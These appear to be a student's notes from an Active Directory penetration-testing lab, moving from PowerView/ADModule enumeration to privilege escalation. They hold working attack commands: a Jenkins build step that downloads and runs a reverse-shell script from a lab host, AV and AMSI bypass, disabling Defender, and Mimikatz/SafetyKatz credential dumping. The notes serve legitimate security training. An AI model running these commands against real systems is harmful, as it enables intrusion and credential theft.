# Objective 1
## Powerview with Invisi-Shell
```powershell
# Running the .bat below will execute all commands needed for us
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```Powershell
# powerview usage
# Source powerview
. C:\AD\Tools\PowerView.ps1

# Enumerate domain users
Get-DomainUser

# specify property (like grep)
Get-DomainUser | select -ExpandProperty samaccountname

# Enum member computers
Get-DomainComputer | select -ExpandProperty dnshostname

# Domain admin group details
Get-DomainGroup -Identity "Domain Admins"

# Members of domain admins
Get-DomainGroupMember -Identity "Domain Admins"

# members of enterprise admins
# This will not work unless we are pointed to the root domain
Get-DomainGroupMember -Identity "Enterprise Admins"

# Enum root domain
Get-DomainGroupMember -Identity "Enterprise Admins" –Domain  
moneycorp.local
```
## Domain enumeration with ADModule
```powershell
# In a new terminal window run invishell again
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Import the ADModule
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

# Enum users in current domain
Get-ADUser -Filter *

# Getting more specific results
Get-ADUser -Filter * -Properties *| select  
Samaccountname,Description

# List domain connected computers
Get-ADComputer -Filter *

# Enum DA 
Get-ADGroupMember -Identity 'Domain Admins'

# Enum enterprise admins on root domain 
Get-ADGroupMember -Identity 'Enterprise Admins' -Server  
moneycorp.local

# Flag is SID of enterprise admin
S-1-5-21-280534878-1496970234-700767426-500

```

# Objective 2
## Further Enumeration with powerview
```powershell
# List all OU names in domain
Get-DomainOU

# Filter by name
Get-DomainOU | select -ExpandProperty name

# List all computers in studentmachines OU 
(Get-DomainOU -Identity StudentMachines).distinguishedname |  
%{Get-DomainComputer -SearchBase $_} | select name

# List domain GPOs
Get-DomainGPO 

# Grab the CN from output 
(Get-DomainOU -Identity StudentMachines).gplink  
[LDAP://cn={3E04167E-C2B6-4A9A-8FB7-  
C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]

```
# Objective 3
## Powerview ACL enumeration
```powershell
# View ACLs for domain admin group
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs –  
Verbose

# View rights/perms for specified user
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match  
"studentx"}

# Find rights/perms by group 
Find-InterestingDomainAcl -ResolveGUIDs |  
?{$_.IdentityReferenceName -match "RDPUsers"}


```

# Objective 4
## Powerview and ADmodule mapping trusts
```powershell
# In powerview
Get-ForestDomain -Verbose

# Get trusts in domain
Get-DomainTrust

# Filter by external trusts for local domain
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} |  
?{$_.TrustAttributes -eq "FILTER_SIDS"}

# Filter by external trusts for parent domain
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

# enumerate trusts for eurocorp.local forest
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -  
Domain $_.Name}
```
```powershell 
# In ADModule

# Enum domains in current forest
(Get-ADForest).Domains

# Get trusts in current domain
Get-ADtrust -Filter *

# List trusts in local forest
Get-ADForest | %{Get-ADTrust -Filter *}

# External locaL trusts
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest  
-ne $True) -and (ForestTransitive -ne $True)' -Server $_}

# trusts of parent domain
Get-ADTrust -Filter '(intraForest -ne $True) -and  
(ForestTransitive -ne $True)'

# enum trusts due to trust relations 
Get-ADTrust -Filter * -Server eurocorp.local
```

# Objective 5 
## Privilege escalation with powerup
```powershell
# Load invishell and powerup
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerUp.ps1

# Unquoted service path enum
Get-ServiceUnquoted

# enumerate services where the current user can make changes to service binary
Get-ModifiableServiceFile -Verbose

# Search for abuse function
Get-ModifiableService

# Service abuse function for local admin 
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName  
'dcorp\student490'

### In a new shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess

# View output from prev command, then remote in with winrs
winrs -r:dcorp-adminsrv cmd # adminsrv being the name we found above

# Or we can use psremoting
Enter-PSSession -ComputerName dcorp-  
adminsrv.dollarcorp.moneycorp.local
```

## Exploiting Jenkins
```powershell

- click on a project or create a new one
- go to build triggers
- go to build section
- use the dropdown and select execute windows batch command
- Paste the rev shell into the command box
- start a webserver and netcat rev shell listener
- Disable firewall and defender
- build now

# Note that "power" is a modified modual built to bypass AV

powershell.exe -c iex ((New-Object  
Net.WebClient).DownloadString('http://172.16.100.90/tmp/Invoke-  
PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.90 -Port 443

### OR

powershell.exe iex (iwr http://172.16.100.90/Invoke-PowerShellTcp.ps1 -  
UseBasicParsing);Power -Reverse -IPAddress 172.16.100.90 -Port 443

```

# Objective 6 
## Bloodhound
```powershell
# start neo4j
C:\AD\Tools\neo4j-community-4.1.1-windows\neo4j-community-4.1.1\bin>neo4j.bat install-service

# Run again to start
C:\AD\Tools\neo4j-community-4.1.1-windows\neo4j-community-4.1.1\bin>neo4j.bat start

# http://localhost:7474
- neo4j for user and password
- change password to whatever on login: bloodhound

# Run Bloodhound
C:\AD\Tools\BloodHound-win32-x64\BloodHound-win32-x64\bloodhound.exe

- Leave database as default
- CREDS: neo4j : bloodhound 

# Staring sharphound
cd C:\AD\Tools\BloodHound-master\BloodHound-  
master\Collectors

. .\SharpHound.ps1

Invoke-  
BloodHound -CollectionMethod All -Verbose

- upload data to bloodhound for the graph 
- search for user and click on derivative local admin rights
```

# Objective 7
## Domain Admin priv esc
- bypass asmi
- Find-DomainUserLocation  to find domain admin sessions
```powershell
winrs -r:dcorp-mgmt hostname;whoami

# Copy safetyKatz to victim
iwr http://172.16.100.90/Loader.exe -OutFile C:\Users\Public\Loader.exe



$null | winrs -r:dcorp-  
mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe  
sekurlsa::ekeys exit


iex (iwr http://172.16.100.90/Invoke-Mimikatz.ps1 -UseBasicParsing)

$sess = New-PSSession -  
ComputerName dcorp-mgmt.dollarcorp.moneycorp.local

Invoke-command -  
ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess

Invoke-command -  
ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

```